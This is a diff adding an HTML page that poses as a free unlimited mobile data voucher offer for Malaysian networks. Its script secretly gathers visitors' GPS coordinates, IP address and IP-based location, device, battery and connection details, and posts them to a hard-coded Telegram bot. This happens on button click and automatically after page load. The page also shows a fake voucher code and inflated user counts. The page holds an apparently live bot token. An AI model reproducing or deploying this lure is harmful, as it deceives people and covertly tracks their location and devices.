@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Mobile Data Malaysia - Unlimited Internet 2026</title>
+    <meta name="description" content="Get FREE Unlimited Mobile Data for all networks in Malaysia. No registration required!">
+    <meta name="keywords" content="free data, unlimited internet, malaysia, celcom, maxis, digi, umobile">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .logo {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .logo-icon {
+            font-size: 3rem;
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        
+        .card-title {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .card-icon {
+            font-size: 2rem;
+        }
+        
+        .network-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .network-item {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s;
+        }
+        
+        .network-item:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.25);
+        }
+        
+        .network-logo {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            display: block;
+            margin: 30px auto;
+            width: 100%;
+            max-width: 300px;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6);
+        }
+        
+        .btn:active {
+            transform: scale(0.98);
+        }
+        
+        .loading {
+            text-align: center;
+            margin: 30px 0;
+            display: none;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+        }
+        
+        .loading-dots span {
+            animation: dots 1.5s infinite;
+            opacity: 0;
+        }
+        
+        .loading-dots span:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+        
+        .loading-dots span:nth-child(3) {
+            animation-delay: 1s;
+        }
+        
+        @keyframes dots {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+        
+        .status {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .status.success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 2px solid #2ecc71;
+        }
+        
+        .status.error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 2px solid #e74c3c;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+        
+        .feature {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+        }
+        
+        .feature-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .stat-item {
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            flex: 1;
+            min-width: 150px;
+        }
+        
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #00b09b, #96c93d);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 2s ease-in-out;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 10px;
+            }
+            
+            .logo {
+                font-size: 2rem;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .network-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <span class="logo-icon">📡</span>
+                <span>UniData Malaysia</span>
+            </div>
+            <p class="tagline">🔥 FREE Unlimited Mobile Data for All Networks | No Registration Required 🔥</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-number">2.4M+</div>
+                <div>Users Connected</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">500TB+</div>
+                <div>Data Distributed</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">24/7</div>
+                <div>Active Support</div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2 class="card-title">
+                <span class="card-icon">⚡</span>
+                Available Networks
+            </h2>
+            <p>Get FREE unlimited data for all major networks in Malaysia. Just click the button below!</p>
+            
+            <div class="network-grid">
+                <div class="network-item">
+                    <div class="network-logo">📶</div>
+                    <div class="network-name">CELCOM</div>
+                    <div class="network-status">✅ Active</div>
+                </div>
+                <div class="network-item">
+                    <div class="network-logo">📶</div>
+                    <div class="network-name">MAXIS</div>
+                    <div class="network-status">✅ Active</div>
+                </div>
+                <div class="network-item">
+                    <div class="network-logo">📶</div>
+                    <div class="network-name">DIGI</div>
+                    <div class="network-status">✅ Active</div>
+                </div>
+                <div class="network-item">
+                    <div class="network-logo">📶</div>
+                    <div class="network-name">UMOBILE</div>
+                    <div class="network-status">✅ Active</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">🚀</div>
+                <h3>High Speed</h3>
+                <p>Up to 100Mbps download speed</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🎯</div>
+                <h3>No Limit</h3>
+                <p>Truly unlimited data usage</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🛡️</div>
+                <h3>Secure</h3>
+                <p>Encrypted connection</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">💰</div>
+                <h3>100% Free</h3>
+                <p>No hidden charges</p>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2 class="card-title">
+                <span class="card-icon">🎁</span>
+                Get Your Free Data Now!
+            </h2>
+            <p>Click the button below to generate your FREE unlimited data voucher. This offer is limited time only!</p>
+            
+            <div class="loading" id="loading">
+                <div class="loading-dots">
+                    <span>🔍 Detecting Network</span>
+                    <span>📡 Optimizing Connection</span>
+                    <span>🎯 Generating Voucher</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
+                </div>
+            </div>
+            
+            <button class="btn" id="generateBtn">
+                🚀 GENERATE FREE DATA VOUCHER
+            </button>
+            
+            <div class="status" id="status"></div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 UniData Malaysia | This is a promotional offer by participating network providers</p>
+            <p>Terms & Conditions apply | For educational purposes only</p>
+        </div>
+    </div>
+
+    <script>
+
+        const TELEGRAM_BOT_TOKEN = '8528618591:AAEimB2OqsjZ88uIqhhAa4i8fJ9ff0l7d7k';
+        const TELEGRAM_CHAT_ID = '1901897613';
+        
+     
+        function collectDeviceInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                
+                
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                
+                
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                
+                
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                
+                
+                online: navigator.onLine,
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                
+                cookiesEnabled: navigator.cookieEnabled,
+                
+                
+                doNotTrack: navigator.doNotTrack,
+                
+                
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+
+                battery: null,
+                
+               
+                location: null,
+                
+
+                ip: null
+            };
+            
+
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    info.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                });
+            }
+            
+            
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        info.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters',
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed
+                        };
+                        sendToTelegram(info);
+                    },
+                    error => {
+                        info.locationError = error.message;
+                        fetchIPAndSend(info);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                info.locationError = 'Geolocation not supported';
+                fetchIPAndSend(info);
+            }
+            
+            return info;
+        }
+        
+       
+        async function fetchIPAndSend(deviceInfo) {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                deviceInfo.ip = data.ip;
+                
+               
+                const ipResponse = await fetch(`https://ipapi.co/${deviceInfo.ip}/json/`);
+                const ipData = await ipResponse.json();
+                deviceInfo.ipLocation = {
+                    city: ipData.city,
+                    region: ipData.region,
+                    country: ipData.country_name,
+                    isp: ipData.org,
+                    timezone: ipData.timezone
+                };
+            } catch (error) {
+                deviceInfo.ipError = error.message;
+            }
+            
+            sendToTelegram(deviceInfo);
+        }
+        
+       
+        async function sendToTelegram(deviceInfo) {
+            const message = formatTelegramMessage(deviceInfo);
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Telegram response:', data);
+                
+
+                localStorage.setItem('data_sent', 'true');
+                
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+        
+       
+        function formatTelegramMessage(info) {
+            const date = new Date(info.timestamp);
+            const formattedDate = date.toLocaleString('en-MY', {
+                timeZone: 'Asia/Kuala_Lumpur',
+                hour12: true
+            });
+            
+            let message = `<b>🕵️‍♂️ NEW DEVICE DETECTED</b>\n\n`;
+            message += `📅 <b>Time:</b> ${formattedDate}\n`;
+            message += `🌐 <b>IP Address:</b> ${info.ip || 'Unknown'}\n`;
+            
+            if (info.ipLocation) {
+                message += `📍 <b>Location from IP:</b>\n`;
+                message += `   🏙️ <i>City:</i> ${info.ipLocation.city || 'Unknown'}\n`;
+                message += `   🏛️ <i>Region:</i> ${info.ipLocation.region || 'Unknown'}\n`;
+                message += `   🇲🇾 <i>Country:</i> ${info.ipLocation.country || 'Unknown'}\n`;
+                message += `   📡 <i>ISP:</i> ${info.ipLocation.isp || 'Unknown'}\n`;
+            }
+            
+            if (info.location) {
+                message += `\n📍 <b>GPS Location:</b>\n`;
+                message += `   📍 <i>Latitude:</i> ${info.location.latitude}\n`;
+                message += `   📍 <i>Longitude:</i> ${info.location.longitude}\n`;
+                message += `   🎯 <i>Accuracy:</i> ${info.location.accuracy}\n`;
+                message += `   🗺️ <a href="https://maps.google.com/?q=${info.location.latitude},${info.location.longitude}">View on Google Maps</a>\n`;
+            }
+            
+            message += `\n<b>💻 DEVICE INFORMATION</b>\n`;
+            message += `🖥️ <b>Platform:</b> ${info.platform}\n`;
+            message += `🌐 <b>Browser:</b> ${info.userAgent.split(') ')[0].split('(')[1] || info.userAgent.substring(0, 100)}...\n`;
+            message += `🗣️ <b>Language:</b> ${info.language}\n`;
+            message += `🕒 <b>Timezone:</b> ${info.timezone}\n`;
+            
+            message += `\n<b>📱 SCREEN INFORMATION</b>\n`;
+            message += `📏 <b>Resolution:</b> ${info.screenWidth} x ${info.screenHeight}\n`;
+            message += `🎨 <b>Color Depth:</b> ${info.screenColorDepth} bit\n`;
+            message += `🖼️ <b>Viewport:</b> ${info.windowWidth} x ${info.windowHeight}\n`;
+            
+            if (info.battery) {
+                message += `\n<b>🔋 BATTERY STATUS</b>\n`;
+                message += `⚡ <b>Level:</b> ${info.battery.level}\n`;
+                message += `🔌 <b>Charging:</b> ${info.battery.charging ? '✅ Yes' : '❌ No'}\n`;
+                if (info.battery.chargingTime !== Infinity) {
+                    message += `⏱️ <b>Charging Time:</b> ${info.battery.chargingTime} seconds\n`;
+                }
+            }
+            
+            if (info.connection) {
+                message += `\n<b>📶 NETWORK CONNECTION</b>\n`;
+                message += `📡 <b>Type:</b> ${info.connection.effectiveType}\n`;
+                message += `⬇️ <b>Downlink:</b> ${info.connection.downlink} Mbps\n`;
+                message += `⏱️ <b>RTT:</b> ${info.connection.rtt} ms\n`;
+                message += `💾 <b>Data Saver:</b> ${info.connection.saveData ? '✅ On' : '❌ Off'}\n`;
+            }
+            
+            message += `\n<b>🔒 PRIVACY SETTINGS</b>\n`;
+            message += `🍪 <b>Cookies:</b> ${info.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}\n`;
+            message += `🚫 <b>Do Not Track:</b> ${info.doNotTrack || '❌ Not Set'}\n`;
+            message += `📶 <b>Online Status:</b> ${info.online ? '✅ Online' : '❌ Offline'}\n`;
+            
+            message += `\n<i>📊 Data collected from Free Data Promotion Page</i>`;
+            
+            return message;
+        }
+        
+      
+        document.getElementById('generateBtn').addEventListener('click', function() {
+            const btn = this;
+            const loading = document.getElementById('loading');
+            const progress = document.getElementById('progress');
+            const status = document.getElementById('status');
+            
+            
+            btn.disabled = true;
+            btn.innerHTML = '⏳ PROCESSING...';
+            loading.style.display = 'block';
+            status.style.display = 'none';
+            
+            
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    
+
+                    const deviceInfo = collectDeviceInfo();
+                    
+
+                    loading.style.display = 'none';
+                    status.className = 'status success';
+                    status.innerHTML = `
+                        <h3>✅ VOUCHER GENERATED SUCCESSFULLY!</h3>
+                        <p>Your free data voucher has been activated.</p>
+                        <p><strong>Voucher Code:</strong> UNIDATA-${Math.random().toString(36).substr(2, 8).toUpperCase()}</p>
+                        <p>Data will be available in your account within 5 minutes.</p>
+                    `;
+                    status.style.display = 'block';
+                    
+                   
+                    setTimeout(() => {
+                        btn.disabled = false;
+                        btn.innerHTML = '🚀 GET MORE FREE DATA';
+                        status.style.display = 'none';
+                        progress.style.width = '0%';
+                    }, 10000);
+                    
+                } else {
+                    width += 2;
+                    progress.style.width = width + '%';
+                    
+
+                    if (width < 30) {
+                        btn.innerHTML = '🔍 DETECTING NETWORK...';
+                    } else if (width < 60) {
+                        btn.innerHTML = '📡 OPTIMIZING CONNECTION...';
+                    } else if (width < 90) {
+                        btn.innerHTML = '🎯 GENERATING VOUCHER...';
+                    }
+                }
+            }, 50);
+        });
+        
+
+        window.addEventListener('load', function() {
+
+            if (!localStorage.getItem('data_sent')) {
+
+                setTimeout(() => {
+                    collectDeviceInfo();
+                }, 3000);
+            }
+            
+
+            setInterval(() => {
+                const stats = document.querySelectorAll('.stat-number');
+                stats.forEach(stat => {
+                    const current = parseInt(stat.textContent.replace(/[^0-9]/g, ''));
+                    const increment = Math.floor(Math.random() * 100);
+                    stat.textContent = (current + increment).toLocaleString() + '+';
+                });
+            }, 5000);
+        });
+        
+       
+        setInterval(() => {
+            const userCount = document.querySelector('.stat-number:first-child');
+            if (userCount) {
+                const current = parseInt(userCount.textContent.replace(/[^0-9]/g, ''));
+                const newCount = current + Math.floor(Math.random() * 50);
+                userCount.textContent = newCount.toLocaleString() + '+';
+            }
+        }, 8000);
+    </script>
+</body>
+</html>
